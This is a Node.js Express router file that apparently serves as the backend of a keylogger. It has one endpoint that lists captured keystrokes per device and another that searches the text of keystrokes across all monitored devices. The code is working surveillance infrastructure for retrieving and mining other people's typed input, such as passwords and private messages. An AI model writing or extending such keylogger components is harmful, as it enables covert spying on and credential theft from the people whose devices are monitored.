const express = require('express');
const router = express.Router();
const db = require('../utils/db');
const { authMiddleware } = require('../utils/auth');

router.get('/device/:deviceId', authMiddleware, async (req, res) => {
  const { limit = 100, offset = 0 } = req.query;
  const result = await db.query(
    `SELECT * FROM keylogs WHERE device_id = (SELECT id FROM devices WHERE device_id = $1) 
     ORDER BY timestamp DESC LIMIT $2 OFFSET $3`,
    [req.params.deviceId, parseInt(limit), parseInt(offset)]
  );
  res.json(result.rows);
});

router.get('/search', authMiddleware, async (req, res) => {
  const { q, deviceId } = req.query;
  let query = `SELECT k.*, d.device_name FROM keylogs k JOIN devices d ON k.device_id = d.id 
               WHERE k.keystrokes ILIKE $1`;
  const params = [`%${q}%`];
  if (deviceId) { params.push(deviceId); query += ` AND d.device_id = $${params.length}`; }
  query += ' ORDER BY k.timestamp DESC LIMIT 500';
  const result = await db.query(query, params);
  res.json(result.rows);
});

module.exports = router;
